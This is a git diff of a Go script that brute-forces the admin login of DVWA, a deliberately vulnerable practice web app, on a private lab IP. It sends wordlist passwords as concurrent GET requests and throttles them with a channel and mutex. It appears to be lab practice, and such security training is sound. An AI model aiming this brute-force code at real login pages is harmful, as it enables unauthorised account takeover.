@@ -12,18 +12,13 @@ import (
 	"sync"
 )
 
-//
-//func req(url_ string)(*http.Response, error){
-//	ret_, err_ := http.Get(url_)
-//	return ret_, err_
-//}
-
 func main() {
-	//count := 0
+	ch := make(chan string, 150)
 	var wg sync.WaitGroup
-	wg.Add(1000)
-	filePath := "C:\\Users\\Zank\\go\\src\\brute\\password-top100.txt"
-	//filePath := "C:\\Users\\Zank\\go\\src\\brute\\MD5pass.txt"
+	lock := &sync.Mutex{}
+	wg.Add(55898)
+	//filePath := "C:\\Users\\Zank\\go\\src\\brute\\password-top100.txt"
+	filePath := "C:\\Users\\Zank\\go\\src\\brute\\MD5pass.txt"
 
 	f, err := os.Open(filePath)
 	if err != nil {
@@ -38,8 +33,6 @@ func main() {
 				break
 			}
 		}
-		//line = url.PathEscape(string(line))
-		//fmt.Println(line)
 		url_ := "http://192.168.124.26/dvwa/vulnerabilities/brute/?" // ?username=admin&password=" + line + "&Login=Login#"
 		//url_ = url.QueryEscape(url_)
 		var urlN = url.Values{}
@@ -47,11 +40,11 @@ func main() {
 		urlN.Add("password", line)
 		urlN.Add("username", "admin")
 		url_ = url_ + urlN.Encode() + "#"
-		//count += 1
-		go func(url_ string, wg *sync.WaitGroup) {
-			//fmt.Println(count)
-			//res, err := http.Get(url)
 
+		go func(url_ string, wg *sync.WaitGroup, ch chan string, lock *sync.Mutex) {
+			lock.Lock()
+			ch <- url_
+			lock.Unlock()
 			resp, err := http.NewRequest("GET", url_, nil)
 			if err != nil {
 				fmt.Println(err)
@@ -74,6 +67,7 @@ func main() {
 					fmt.Println(url_)
 					fmt.Println(len(string(body_)))
 					res.Body.Close()
+					<-ch
 					break
 
 				}
@@ -82,7 +76,7 @@ func main() {
 
 			wg.Done()
 
-		}(url_, &wg)
+		}(url_, &wg, ch, lock)
 
 	}
 	wg.Wait()
